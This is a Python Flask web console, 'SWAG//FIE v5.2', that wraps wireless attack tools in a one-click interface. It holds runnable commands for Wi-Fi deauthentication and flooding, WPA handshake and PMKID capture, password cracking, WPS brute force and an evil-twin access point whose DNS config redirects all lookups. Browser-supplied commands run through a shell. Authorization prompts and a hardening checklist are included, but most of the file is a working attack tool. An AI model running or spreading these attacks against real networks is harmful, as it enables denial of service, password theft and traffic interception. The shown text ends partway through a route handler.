#!/usr/bin/env python3
# SWAG//FIE v5.2 — Wireless testing framework (Black & White Web GUI)
# Made by Heaven Swag  |  Authorized testing only
#
# Run:  pip install flask
#       sudo python3 swagfie.py
# Open: http://127.0.0.1:5000
#
# Runs on: Kali (full), Linux (full if tools present), Windows/macOS/Pydroid (DEMO)

import os, re, sys, json, time, shutil, signal, threading, subprocess, datetime, queue, uuid, secrets
from flask import Flask, Response, request, jsonify

# ─────────────────────────── PLATFORM ───────────────────────────
IS_ANDROID = ("ANDROID_ROOT" in os.environ or "ANDROID_DATA" in os.environ)
IS_ROOT    = (hasattr(os, "geteuid") and os.geteuid() == 0)

def _writable_dir(*cands):
    for d in cands:
        if not d: continue
        try:
            os.makedirs(d, exist_ok=True)
            t = os.path.join(d, ".wt"); open(t, "w").write("x"); os.remove(t)
            return d
        except OSError: continue
    return os.path.expanduser(".")

BASE_DIR = _writable_dir(
    os.environ.get("SWAGFIE_DIR"),
    os.path.join(os.path.expanduser("~"), ".swagfie"),
    "/data/data/ru.iiec.pydroid3/files/swagfie",
    os.path.join(os.getcwd(), "swagfie_data"),
)
LOG_PATH = os.path.join(BASE_DIR, "swagfie.log")
HOST = "127.0.0.1"
PORT = int(os.environ.get("SWAGFIE_PORT", 5000))

REQUIRED_TOOLS = ("aircrack-ng","airodump-ng","aireplay-ng","hashcat",
                  "hcxdumptool","hcxpcapngtool","tshark","reaver","mdk4","hostapd")
MISSING_TOOLS = [t for t in REQUIRED_TOOLS if not shutil.which(t)]
DEMO_MODE     = IS_ANDROID or not IS_ROOT or bool(MISSING_TOOLS)

def log(msg):
    try:
        with open(LOG_PATH, "a") as f:
            f.write(f"[{datetime.datetime.now().isoformat()}] {msg}\n")
    except OSError: pass

# ─────────────────────────── VALIDATORS ───────────────────────────
BSSID_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")
def valid_bssid(b): return bool(b and BSSID_RE.match(b))
def valid_ch(c):    return bool(c and str(c).isdigit() and 1 <= int(c) <= 196)

# ─────────────────────────── JOBS ───────────────────────────
class JobManager:
    def __init__(self):
        self.jobs = {}
        self.lock = threading.Lock()

    def start(self, cmd):
        jid = uuid.uuid4().hex[:12]
        q = queue.Queue()
        log(f"EXEC[{jid}] {cmd}")

        if DEMO_MODE:
            def fake():
                q.put(("line", f"[DEMO] Would run: {cmd}"))
                reason = ("Android/Pydroid — no wireless tools" if IS_ANDROID
                          else f"missing: {' '.join(MISSING_TOOLS)}" if MISSING_TOOLS
                          else "not running as root")
                q.put(("line", f"[DEMO] Reason: {reason}"))
                q.put(("exit", 0))
            with self.lock:
                self.jobs[jid] = {"proc": None, "queue": q, "cmd": cmd, "started": time.time()}
            threading.Thread(target=fake, daemon=True).start()
            return jid

        def worker():
            try:
                p = subprocess.Popen(cmd, shell=True, executable="/bin/bash",
                                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                     text=True, bufsize=1, preexec_fn=os.setsid)
                with self.lock:
                    self.jobs[jid]["proc"] = p
                for line in p.stdout:
                    q.put(("line", line.rstrip("\n")))
                p.wait()
                q.put(("exit", p.returncode))
            except Exception as e:
                q.put(("error", str(e)))
            finally:
                with self.lock:
                    self.jobs.pop(jid, None)

        with self.lock:
            self.jobs[jid] = {"proc": None, "queue": q, "cmd": cmd, "started": time.time()}
        threading.Thread(target=worker, daemon=True).start()
        return jid

    def stream(self, jid):
        with self.lock:
            job = self.jobs.get(jid)
        if not job:
            yield sse("error", "Unknown job"); return
        q = job["queue"]
        while True:
            try: kind, data = q.get(timeout=30)
            except queue.Empty:
                yield sse("ping", ""); continue
            if kind == "line": yield sse("line", data)
            elif kind == "exit":
                yield sse("exit", str(data)); return
            else:
                yield sse("error", data); return

    def kill(self, jid):
        with self.lock:
            j = self.jobs.get(jid)
            if not j or not j["proc"]: return False
            try:
                os.killpg(os.getpgid(j["proc"].pid), signal.SIGTERM); return True
            except Exception: return False

    def kill_all(self):
        with self.lock:
            for j in list(self.jobs.values()):
                if j["proc"]:
                    try: os.killpg(os.getpgid(j["proc"].pid), signal.SIGTERM)
                    except Exception: pass

    def list_jobs(self):
        with self.lock:
            return [{"id": k, "cmd": v["cmd"], "started": v["started"],
                     "running": v["proc"] is not None} for k, v in self.jobs.items()]

def sse(event, data):
    return f"event: {event}\ndata: {json.dumps(data)}\n\n"

JOBS = JobManager()

# ─────────────────────────── CATALOG ───────────────────────────
SCANNERS = [
 ("Full-spectrum airodump-ng",       "airodump-ng {IFACE}"),
 ("2.4 GHz scan",                    "airodump-ng --band g -c 1-14 {IFACE}"),
 ("5 GHz scan",                      "airodump-ng --band a {IFACE}"),
 ("Targeted AP + clients",           "airodump-ng -c {CH} --bssid {BSSID} -w tgt {IFACE}"),
 ("Hidden SSID reveal",              "airodump-ng -w hidden --output-format csv {IFACE}"),
 ("WPS AP scan (wash)",              "wash -i {IFACE}"),
 ("PMKID-capable AP survey",         "hcxdumptool -i {IFACE} --do_rcascan --enable_status=1"),
 ("Probe-request logger",            "tshark -i {IFACE} -Y 'wlan.fc.type_subtype==4' -T fields -e wlan.sa -e wlan.ssid"),
 ("Deauth detector",                 "tshark -i {IFACE} -Y 'wlan.fc.type_subtype==12' -T fields -e wlan.sa -e wlan.da"),
 ("Beacon flood detector",           "tshark -i {IFACE} -Y 'wlan.fc.type_subtype==8' -T fields -e wlan.ssid | sort | uniq -c | sort -rn | head"),
 ("Handshake check",                 "aircrack-ng -b {BSSID} {CAP}"),
 ("PCAP → hashcat 22000",            "hcxpcapngtool {CAP} -o hash.22000 && cat hash.22000"),
 ("LAN host discovery",              "nmap -sn 192.168.1.0/24"),
 ("LAN service enum",                "nmap -sV -T4 --top-ports 200 192.168.1.1"),
 ("ARP scan",                        "arp-scan --localnet"),
]

ATTACKS = [
 ("Enable monitor mode",             "airmon-ng check kill && airmon-ng start wlan0"),
 ("Capture WPA handshake",           "airodump-ng -c {CH} --bssid {BSSID} -w hs {IFACE}"),
 ("Deauth client (5)",               "aireplay-ng --deauth 5 -a {BSSID} {IFACE}"),
 ("Deauth broadcast",                "aireplay-ng --deauth 0 -a {BSSID} {IFACE}"),
 ("PMKID capture",                   "hcxdumptool -i {IFACE} -o pmkid.pcapng --enable_status=1"),
 ("PMKID → 22000",                   "hcxpcapngtool pmkid.pcapng -o hash.22000 && cat hash.22000"),
 ("Crack — aircrack",                "aircrack-ng -w {WL} {CAP}"),
 ("Crack — hashcat wordlist",        "hashcat -m 22000 hash.22000 {WL}"),
 ("Crack — hashcat best64",          "hashcat -m 22000 hash.22000 -a 6 {WL} /usr/share/hashcat/rules/best64.rule"),
 ("WPS Pixie-Dust",                  "reaver -i {IFACE} -b {BSSID} -K 1 -vv"),
 ("WPS PIN brute",                   "reaver -i {IFACE} -b {BSSID} -vv -N -d 1"),
 ("Evil twin (hostapd)",             "hostapd /tmp/et.conf"),
 ("Beacon flood (mdk4)",             "mdk4 {IFACE} b -n FloodNet -a s -m"),
 ("Auth flood (mdk4)",               "mdk4 {IFACE} a -a {BSSID} -m"),
 ("Deauth amok (mdk4)",              "mdk4 {IFACE} d -m"),
 ("EAPOL flood",                     "mdk4 {IFACE} e -t {BSSID}"),
]

PROTECTIONS = [
 "Enforce WPA3-SAE only",
 "WPA2/WPA3 transitional, AES-CCMP only — never TKIP",
 "Random 20+ char passphrase (use PSK button)",
 "Rotate PSK every 90 days",
 "Disable WPS entirely",
 "Disable PMKID/RSN caching",
 "Enable 802.11w PMF (blocks deauth)",
 "Disable TKIP (Michael-shutdown DoS)",
 "Firmware updates monthly (KRACK / FragAttacks)",
 "Unique admin password ≠ WiFi password",
 "Disable WAN/remote admin",
 "802.1X/RADIUS for business",
 "MAC ACL as second layer only",
 "Client isolation on guest SSID",
 "Separate VLAN for IoT",
 "Minimum-RSSI policy",
 "Reduce TX power to coverage need",
 "Disable UPnP",
 "DNS: DoT/DoH for LAN",
 "Run tshark deauth monitor continuously",
 "WIDS: alert on duplicate SSID beacons",
 "Disable legacy 802.11b rates",
 "Band-steer to 5 GHz",
 "Wired backhaul for mesh — never WPS-easy-mesh",
 "Router NTP sync",
 "Encrypted offline config backup",
 "Client: disable auto-join open networks",
 "Client: VPN on untrusted APs",
 "Honey-SSID deployment",
 "Quarterly authorized pentest of own WLAN",
]

# ─────────────────────────── HONEYPOT ───────────────────────────
def write_hostapd(iface, ssid, ch, path):
    with open(path, "w") as f:
        f.write(f"interface={iface.replace('mon','')}\ndriver=nl80211\nssid={ssid}\n"
                f"hw_mode=g\nchannel={ch}\nauth_algs=1\nwpa=2\nwpa_key_mgmt=WPA-PSK\n"
                f"rsn_pairwise=CCMP\nwpa_passphrase=HoneypotPass123!\n")
    return path

def write_dnsmasq(path):
    with open(path, "w") as f:
        f.write("interface=at0\ndhcp-range=10.0.0.10,10.0.0.100,12h\n"
                "dhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\nserver=8.8.8.8\n"
                "log-queries\naddress=/#/10.0.0.1\n")
    return path

# ─────────────────────────── FLASK ───────────────────────────
app = Flask(__name__)
SERVER_CTX = {"iface":"wlan0mon","bssid":"","ch":"","cap":"hs-01.cap",
              "wl":"/usr/share/wordlists/rockyou.txt"}

# ─── PAGE: pure HTML/CSS/JS with two placeholders ───
# __LOGPATH__   → substituted server-side
# __DEMO_BADGE__→ substituted server-side (either "<span class='demo-badge'>DEMO</span>" or "")
# No Jinja. No render_template_string.
PAGE = r"""<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>SWAG//FIE — Wireless Testing Console</title>
<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Barlow+Condensed:wght@400;600;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<style>
:root{
  --bg:      #000000;
  --panel:   #080808;
  --card:    #0e0e0e;
  --field:   #050505;
  --border:  #1a1a1a;
  --border2: #2a2a2a;
  --white:   #ffffff;
  --bright:  #d4d4d4;
  --text:    #8a8a8a;
  --dim:     #565656;
  --muted:   #2a2a2a;
  --fh:'Bebas Neue',sans-serif;
  --fb:'Barlow Condensed',sans-serif;
  --fm:'Share Tech Mono',monospace;
}
*{margin:0;padding:0;box-sizing:border-box;}
[hidden]{display:none!important;}
body{background:var(--bg);color:var(--text);font-family:var(--fb);min-height:100vh;overflow-x:hidden;}
body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:999;
  background:repeating-linear-gradient(0deg,transparent,transparent 2px,
    rgba(255,255,255,.018) 2px,rgba(255,255,255,.018) 4px);}
body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:998;opacity:.5;
  background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.05'/%3E%3C/svg%3E");}
.wrap{max-width:1280px;margin:0 auto;padding:0 18px 80px;position:relative;z-index:2;}
.topbar{display:flex;justify-content:space-between;align-items:center;padding:14px 0;
  border-bottom:1px solid var(--border);flex-wrap:wrap;gap:8px;}
.tbl{font-family:var(--fm);font-size:10px;letter-spacing:4px;color:var(--dim);text-transform:uppercase;}
.tbl span{color:var(--white);}
.status{display:flex;align-items:center;gap:8px;font-family:var(--fm);font-size:10px;letter-spacing:2px;}
.dot{width:8px;height:8px;border-radius:50%;background:var(--muted);}
.dot.ok{background:var(--white);box-shadow:0 0 8px rgba(255,255,255,.8);}
.dot.err{background:var(--white);box-shadow:0 0 8px rgba(255,255,255,.8);opacity:.5;}
.dot.busy{background:var(--white);box-shadow:0 0 8px rgba(255,255,255,.8);animation:blink 1s steps(2) infinite;}
@keyframes blink{50%{opacity:.25;}}

.masthead{position:relative;overflow:hidden;padding:40px 0 30px;
  border-bottom:3px solid var(--white);}
.masthead::before{content:'SWAG//FIE';position:absolute;font-family:var(--fh);
  font-size:clamp(10rem,24vw,22rem);color:rgba(255,255,255,.035);
  top:50%;left:-2%;transform:translateY(-50%);letter-spacing:-8px;
  white-space:nowrap;pointer-events:none;line-height:.8;}
.logo{position:relative;font-family:var(--fh);
  font-size:clamp(6rem,20vw,15rem);line-height:.82;letter-spacing:6px;color:var(--white);}
.logo .slash{color:var(--white);opacity:.35;}
.logo .ver{font-family:var(--fm);font-size:clamp(1rem,2.5vw,1.6rem);color:var(--bright);
  vertical-align:super;letter-spacing:4px;margin-left:14px;}
.sub{position:relative;font-family:var(--fm);font-size:11px;letter-spacing:6px;
  color:var(--dim);text-transform:uppercase;margin-top:18px;}
.demo-badge{display:inline-block;background:var(--white);color:#000;
  font-family:var(--fm);font-size:9px;letter-spacing:2px;
  padding:3px 8px;margin-left:10px;vertical-align:middle;}

.tabs{display:flex;border-bottom:1px solid var(--border);margin-top:24px;flex-wrap:wrap;}
.tab{flex:1;min-width:110px;background:transparent;border:none;
  border-bottom:2px solid transparent;padding:14px 6px;
  font-family:var(--fm);font-size:11px;letter-spacing:3px;
  color:#555;text-transform:uppercase;cursor:pointer;transition:all .2s;}
.tab:hover{color:var(--bright);background:rgba(255,255,255,.03);}
.tab.on{color:var(--white);border-bottom-color:var(--white);background:rgba(255,255,255,.05);}
.tab .n{color:var(--muted);margin-right:6px;}
.tab.on .n{color:var(--white);}

.panel{background:var(--panel);border:1px solid var(--border);border-top:none;padding:24px 22px;}
.panel-head{display:flex;justify-content:space-between;align-items:flex-end;
  margin-bottom:18px;gap:12px;flex-wrap:wrap;}
.sec-num{font-family:var(--fm);font-size:10px;color:var(--bright);letter-spacing:2px;}
.sec-title{font-family:var(--fh);font-size:28px;letter-spacing:2px;color:var(--white);line-height:1;}
label.lbl{display:block;font-family:var(--fm);font-size:10px;letter-spacing:2px;
  color:var(--text);text-transform:uppercase;margin-bottom:6px;}
input[type=text]{width:100%;background:var(--field);border:1px solid var(--border2);
  border-radius:0;color:var(--white);padding:10px 12px;
  font-family:var(--fb);font-size:16px;outline:none;
  transition:border-color .15s,box-shadow .15s;}
input:focus{border-color:var(--white);box-shadow:0 0 0 1px rgba(255,255,255,.25);}
.field{margin-bottom:14px;}
.grid5{display:grid;grid-template-columns:repeat(5,1fr);gap:10px;}
@media(max-width:900px){.grid5{grid-template-columns:1fr 1fr;}}
@media(max-width:500px){.grid5{grid-template-columns:1fr;}}

.btn{font-family:var(--fm);font-size:11px;letter-spacing:2px;text-transform:uppercase;
  padding:11px 18px;border:1px solid var(--white);background:transparent;
  color:var(--white);cursor:pointer;transition:all .15s;display:inline-block;}
.btn:hover:not(:disabled){background:rgba(255,255,255,.1);color:#fff;}
.btn.primary{background:var(--white);color:#000;font-weight:700;border-color:var(--white);}
.btn.primary:hover:not(:disabled){background:var(--bright);border-color:var(--bright);color:#000;}
.btn.ghost{border-color:var(--border2);color:var(--text);}
.btn.ghost:hover:not(:disabled){border-color:var(--white);color:var(--white);background:transparent;}
.btn.small{padding:7px 12px;font-size:10px;}
.btn:disabled{opacity:.35;cursor:not-allowed;}
.btn-row{display:flex;gap:10px;flex-wrap:wrap;margin-top:6px;}
.msg{font-family:var(--fm);font-size:11px;margin-top:14px;min-height:16px;}
.msg.ok{color:var(--white);}
.msg.err{color:var(--bright);}

.cmd-list{list-style:none;max-height:520px;overflow-y:auto;
  border:1px solid var(--border);background:var(--field);}
.cmd-list li{display:flex;justify-content:space-between;gap:12px;padding:10px 14px;
  border-bottom:1px solid var(--border);align-items:center;transition:background .15s;}
.cmd-list li:hover{background:rgba(255,255,255,.04);}
.cmd-list li:last-child{border-bottom:none;}
.cmd-name{flex:1;color:var(--bright);font-size:15px;}
.cmd-num{font-family:var(--fm);font-size:10px;color:var(--white);letter-spacing:1px;min-width:30px;}
.cmd-hint{font-family:var(--fm);font-size:9px;color:var(--muted);max-width:40%;
  overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}

.jobs-list{list-style:none;margin-top:10px;}
.job-item{background:var(--card);border:1px solid var(--border2);
  border-left:3px solid var(--white);padding:12px 14px;margin-bottom:8px;
  display:flex;justify-content:space-between;gap:12px;align-items:center;}
.job-cmd{font-family:var(--fm);font-size:11px;color:var(--bright);
  word-break:break-all;flex:1;}
.job-meta{font-family:var(--fm);font-size:10px;color:var(--dim);}

.console{background:#000;border:1px solid var(--border);height:460px;
  overflow-y:auto;padding:14px;font-family:var(--fm);font-size:11px;line-height:1.6;}
.console-line{white-space:pre-wrap;word-break:break-word;color:#9a9a9a;}
.console-line.cmd{color:var(--white);}
.console-line.exit-0{color:var(--bright);}
.console-line.exit-n{color:var(--white);text-decoration:underline;}
.console-line.error{color:var(--white);font-weight:bold;}

.toast{position:fixed;bottom:24px;left:50%;transform:translate(-50%,20px);opacity:0;
  pointer-events:none;background:#000;border:1px solid var(--white);
  border-left:3px solid var(--white);color:var(--white);
  font-family:var(--fm);font-size:11px;letter-spacing:1.5px;
  padding:12px 18px;z-index:1001;transition:all .25s;max-width:90vw;}
.toast.show{opacity:1;transform:translate(-50%,0);}

.footer{margin-top:36px;padding-top:18px;border-top:1px solid var(--border);
  text-align:center;font-family:var(--fm);font-size:10px;
  letter-spacing:4px;color:var(--dim);}
.footer b{color:var(--white);font-weight:normal;}

.prot-list{list-style:none;counter-reset:p;max-height:520px;overflow-y:auto;
  border:1px solid var(--border);background:var(--field);}
.prot-list li{counter-increment:p;padding:10px 14px;border-bottom:1px solid var(--border);
  color:var(--bright);font-size:15px;display:flex;gap:14px;align-items:center;}
.prot-list li::before{content:counter(p,decimal-leading-zero);font-family:var(--fm);
  font-size:10px;color:var(--white);min-width:24px;}

.hp-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:14px;}
@media(max-width:800px){.hp-grid{grid-template-columns:1fr 1fr;}}
</style></head><body>
<div class="wrap">
<div class="topbar">
<div class="tbl">WIRELESS<span>::</span>TESTING &nbsp;/&nbsp; AUTHORIZED ONLY</div>
<div class="status"><span id="dot" class="dot"></span><span id="statusText">STANDBY</span></div>
</div>

<div class="masthead">
<div class="logo">SWAG<span class="slash">//</span>FIE<span class="ver">v5.2</span>__DEMO_BADGE__</div>
<div class="sub">Black &amp; white wireless testing — made by Heaven Swag</div>
</div>

<div class="tabs">
<button class="tab on" data-tab="context"><span class="n">00</span>Context</button>
<button class="tab" data-tab="scanners"><span class="n">01</span>Scanners</button>
<button class="tab" data-tab="attacks"><span class="n">02</span>Attacks</button>
<button class="tab" data-tab="protections"><span class="n">03</span>Protections</button>
<button class="tab" data-tab="honeypot"><span class="n">04</span>Honeypot</button>
<button class="tab" data-tab="console"><span class="n">05</span>Console</button>
</div>

<section class="panel" id="pane-context">
<div class="panel-head"><div><div class="sec-num">00 / IDENTITY</div><div class="sec-title">Engagement context</div></div></div>
<div class="grid5">
<div class="field"><label class="lbl">Interface</label><input type="text" id="ctxIface" value="wlan0mon"></div>
<div class="field"><label class="lbl">BSSID</label><input type="text" id="ctxBssid" placeholder="aa:bb:cc:dd:ee:ff"></div>
<div class="field"><label class="lbl">Channel</label><input type="text" id="ctxCh" placeholder="1-196"></div>
<div class="field"><label class="lbl">Capture</label><input type="text" id="ctxCap" value="hs-01.cap"></div>
<div class="field"><label class="lbl">Wordlist</label><input type="text" id="ctxWl" value="/usr/share/wordlists/rockyou.txt"></div>
</div>
<div class="btn-row">
<button class="btn primary" id="saveCtx">Save context</button>
<button class="btn ghost" id="genPsk">Generate PSK</button>
<button class="btn ghost" id="killAll">■ Kill all jobs</button>
</div>
<div id="ctxMsg" class="msg"></div>
<div class="panel-head" style="margin-top:26px;"><div><div class="sec-num">ACTIVE</div><div class="sec-title">Running jobs</div></div></div>
<ul class="jobs-list" id="jobsList"><li style="padding:14px;color:var(--dim);font-family:var(--fm);font-size:11px;">No jobs.</li></ul>
</section>

<section class="panel" id="pane-scanners" hidden>
<div class="panel-head"><div><div class="sec-num">01 / RECON</div><div class="sec-title">Scanners</div></div></div>
<ul class="cmd-list" id="scannerList"></ul>
</section>

<section class="panel" id="pane-attacks" hidden>
<div class="panel-head"><div><div class="sec-num">02 / OFFENSIVE</div><div class="sec-title">Attacks — authorization required</div></div></div>
<ul class="cmd-list" id="attackList"></ul>
</section>

<section class="panel" id="pane-protections" hidden>
<div class="panel-head"><div><div class="sec-num">03 / DEFENSE</div><div class="sec-title">Hardening checklist</div></div></div>
<ul class="prot-list" id="protList"></ul>
</section>

<section class="panel" id="pane-honeypot" hidden>
<div class="panel-head"><div><div class="sec-num">04 / DECEPTION</div><div class="sec-title">Honeypot / evil-twin</div></div></div>
<div class="hp-grid">
<div class="field"><label class="lbl">Interface</label><input type="text" id="hpIface" value="wlan0"></div>
<div class="field"><label class="lbl">SSID</label><input type="text" id="hpSsid" value="FreeWiFi"></div>
<div class="field"><label class="lbl">Channel</label><input type="text" id="hpChan" value="6"></div>
<div class="field"><label class="lbl">Log</label><input type="text" id="hpLog" value="/var/log/wifi-honeypot.log"></div>
</div>
<div class="btn-row">
<button class="btn primary" id="launchHp">▶ Launch honeypot</button>
<button class="btn ghost" id="launchEt">▶ Launch evil-twin</button>
</div>
<div id="hpMsg" class="msg"></div>
</section>

<section class="panel" id="pane-console" hidden>
<div class="panel-head"><div><div class="sec-num">05 / OUTPUT</div><div class="sec-title">Live console</div></div>
<button class="btn ghost small" id="clearConsole">Clear</button></div>
<div class="console" id="console"></div>
</section>

<div class="footer">SWAG<b>//</b>FIE v5.2 &nbsp;·&nbsp; AUTHORIZED TESTING ONLY &nbsp;·&nbsp; Log: __LOGPATH__</div>
</div>
<div class="toast" id="toast"></div>
<script>
const $=id=>document.getElementById(id);
let ctx={iface:'wlan0mon',bssid:'',ch:'',cap:'hs-01.cap',wl:'/usr/share/wordlists/rockyou.txt'};
let evtSource=null;

function showTab(n){
  document.querySelectorAll('.tab').forEach(b=>b.classList.toggle('on',b.dataset.tab===n));
  ['context','scanners','attacks','protections','honeypot','console'].forEach(x=>$('pane-'+x).hidden=(x!==n));
  if(n==='context')refreshJobs();
}
document.querySelectorAll('.tab').forEach(b=>b.onclick=()=>showTab(b.dataset.tab));

function setStatus(k,t){$('dot').className='dot '+k;$('statusText').textContent=t.toUpperCase();}
function toast(m){const t=$('toast');t.textContent=m;t.classList.add('show');clearTimeout(toast._t);toast._t=setTimeout(()=>t.classList.remove('show'),3200);}
function consoleAppend(t,c){const b=$('console');const d=document.createElement('div');d.className='console-line '+(c||'');d.textContent=t;b.appendChild(d);b.scrollTop=b.scrollHeight;}
$('clearConsole').onclick=()=>{$('console').innerHTML='';};

function loadCtx(){ctx.iface=$('ctxIface').value.trim();ctx.bssid=$('ctxBssid').value.trim();ctx.ch=$('ctxCh').value.trim();ctx.cap=$('ctxCap').value.trim();ctx.wl=$('ctxWl').value.trim();}
$('saveCtx').onclick=async()=>{
  loadCtx();
  const r=await fetch('/api/context',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(ctx)});
  const j=await r.json();
  if(j.ok){$('ctxMsg').className='msg ok';$('ctxMsg').textContent='Context saved.';toast('Saved.');}
  else{$('ctxMsg').className='msg err';$('ctxMsg').textContent='Error: '+(j.error||'?');}
};
$('genPsk').onclick=async()=>{const r=await fetch('/api/psk');const j=await r.json();toast('PSK: '+j.psk);$('ctxMsg').className='msg ok';$('ctxMsg').textContent='PSK: '+j.psk;};
$('killAll').onclick=async()=>{await fetch('/api/killall',{method:'POST'});toast('All killed.');refreshJobs();};

async function loadCommands(){
  const r=await fetch('/api/commands');const j=await r.json();
  renderList('scannerList',j.scanners,'scan');renderList('attackList',j.attacks,'attack');
  const pl=$('protList');pl.innerHTML='';
  j.protections.forEach(p=>{const li=document.createElement('li');li.textContent=p;pl.appendChild(li);});
}
function renderList(id,items,kind){
  const ul=$(id);ul.innerHTML='';
  items.forEach((it,i)=>{
    const li=document.createElement('li');
    li.innerHTML=`<span class="cmd-num">${String(i+1).padStart(2,'0')}</span>
      <span class="cmd-name">${esc(it.name)}</span>
      <span class="cmd-hint">${esc(it.cmd)}</span>
      <button class="btn ${kind==='attack'?'primary':'ghost'} small">Run</button>`;
    li.querySelector('button').onclick=()=>runCommand(it.cmd,it.name,kind);
    ul.appendChild(li);
  });
}
function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}

async function runCommand(cmd,name,kind){
  loadCtx();
  if(cmd.includes('{BSSID}')&&!/^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/.test(ctx.bssid)){toast('Invalid BSSID');showTab('context');$('ctxBssid').focus();return;}
  if(cmd.includes('{CH}')&&!(ctx.ch&&+ctx.ch>=1&&+ctx.ch<=196)){toast('Invalid channel');showTab('context');$('ctxCh').focus();return;}
  if(kind==='attack'){const ok=await modalConfirm('AUTHORIZATION REQUIRED',`ATTACK: ${name}\n\nCommand:\n${cmd}\n\nConfirm WRITTEN authorization.`);if(!ok){toast('Cancelled');return;}}
  const r=await fetch('/api/run',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({cmd,name,kind,ctx,authorized:kind==='attack'})});
  const j=await r.json();
  if(!j.job_id){toast('Failed: '+(j.error||'?'));return;}
  showTab('console');consoleAppend('▶ '+name+'  ['+cmd+']','cmd');setStatus('busy','Running');
  toast('Started: '+name);refreshJobs();attachSSE(j.job_id);
}

function attachSSE(jid){
  if(evtSource){evtSource.close();evtSource=null;}
  const es=new EventSource('/api/stream/'+jid);evtSource=es;
  es.addEventListener('line',e=>consoleAppend(JSON.parse(e.data)));
  es.addEventListener('error',e=>{try{consoleAppend('[error] '+JSON.parse(e.data),'error');}catch(_){}});
  es.addEventListener('exit',e=>{const c=JSON.parse(e.data);consoleAppend('[exit '+c+']',c==0?'exit-0':'exit-n');setStatus(c==0?'ok':'err',c==0?'Idle':'Exit '+c);es.close();evtSource=null;refreshJobs();});
  es.addEventListener('ping',()=>{});es.onerror=()=>{es.close();evtSource=null;};
}

async function refreshJobs(){
  const r=await fetch('/api/jobs');const j=await r.json();
  const ul=$('jobsList');ul.innerHTML='';
  if(!j.jobs.length){ul.innerHTML='<li style="padding:14px;color:var(--dim);font-family:var(--fm);font-size:11px;">No jobs.</li>';return;}
  j.jobs.forEach(job=>{
    const li=document.createElement('li');li.className='job-item';
    li.innerHTML=`<div class="job-cmd">${esc(job.cmd)}</div>
      <div class="job-meta">${new Date(job.started*1000).toLocaleTimeString()} ${job.running?'●':'·'}</div>
      <button class="btn ghost small">Kill</button>`;
    li.querySelector('button').onclick=async()=>{await fetch('/api/kill/'+job.id,{method:'POST'});toast('Kill sent.');refreshJobs();};
    ul.appendChild(li);
  });
}

function modalConfirm(title,body){
  return new Promise(resolve=>{
    const back=document.createElement('div');
    back.style.cssText='position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:1002;display:flex;align-items:center;justify-content:center;padding:20px;';
    const box=document.createElement('div');
    box.style.cssText='max-width:560px;background:#080808;border:1px solid #ffffff;border-top:3px solid #ffffff;padding:24px;font-family:var(--fm);';
    box.innerHTML=`<div style="font-family:var(--fh);font-size:32px;color:#ffffff;letter-spacing:2px;margin-bottom:12px;">${title}</div>
      <pre style="font-family:var(--fm);font-size:11px;color:#d4d4d4;white-space:pre-wrap;line-height:1.6;margin-bottom:20px;">${esc(body)}</pre>
      <div style="display:flex;gap:10px;justify-content:flex-end;">
      <button class="btn ghost" id="mNo">Cancel</button>
      <button class="btn primary" id="mYes">I have written authorization</button></div>`;
    back.appendChild(box);document.body.appendChild(back);
    box.querySelector('#mYes').onclick=()=>{document.body.removeChild(back);resolve(true);};
    box.querySelector('#mNo').onclick=()=>{document.body.removeChild(back);resolve(false);};
  });
}

$('launchHp').onclick=async()=>{
  const ok=await modalConfirm('AUTHORIZATION REQUIRED',`Launch honeypot "${$('hpSsid').value}" on ${$('hpIface').value}?`);
  if(!ok)return;
  const r=await fetch('/api/honeypot',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({iface:$('hpIface').value,ssid:$('hpSsid').value,ch:$('hpChan').value,
      log:$('hpLog').value,mode:'hp',authorized:true})});
  const j=await r.json();
  if(j.job_id){toast('Honeypot launching');showTab('console');attachSSE(j.job_id);}
  else{$('hpMsg').className='msg err';$('hpMsg').textContent=j.error||'Failed';}
};
$('launchEt').onclick=async()=>{
  const ok=await modalConfirm('AUTHORIZATION REQUIRED',`Launch evil-twin on ${$('hpIface').value}?`);
  if(!ok)return;
  const r=await fetch('/api/honeypot',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({iface:$('hpIface').value,ssid:$('hpSsid').value,ch:$('hpChan').value,
      log:$('hpLog').value,mode:'et',authorized:true})});
  const j=await r.json();
  if(j.job_id){toast('Evil-twin launching');showTab('console');attachSSE(j.job_id);}
  else{$('hpMsg').className='msg err';$('hpMsg').textContent=j.error||'Failed';}
};

loadCommands();showTab('context');setInterval(refreshJobs,4000);setStatus('ok','Ready');
consoleAppend('System ready. Black & white palette online.','');
</script></body></html>"""

# ─────────────────────────── ROUTES ───────────────────────────
@app.route("/")
def index():
    html = PAGE.replace("__LOGPATH__", LOG_PATH)
    badge = ('<span class="demo-badge">DEMO</span>' if DEMO_MODE else '')
    html = html.replace("__DEMO_BADGE__", badge)
    return Response(html, mimetype="text/html",
                    headers={"Cache-Control": "no-store, must-revalidate"})

@app.route("/api/commands")
def api_commands():
    return jsonify({
        "scanners": [{"name": n, "cmd": c} for n, c in SCANNERS],
        "attacks":  [{"name": n, "cmd": c} for n, c in ATTACKS],
        "protections": PROTECTIONS,
    })

@app.route("/api/context", methods=["POST"])
def api_context():
    d = request.get_json(force=True, silent=True) or {}
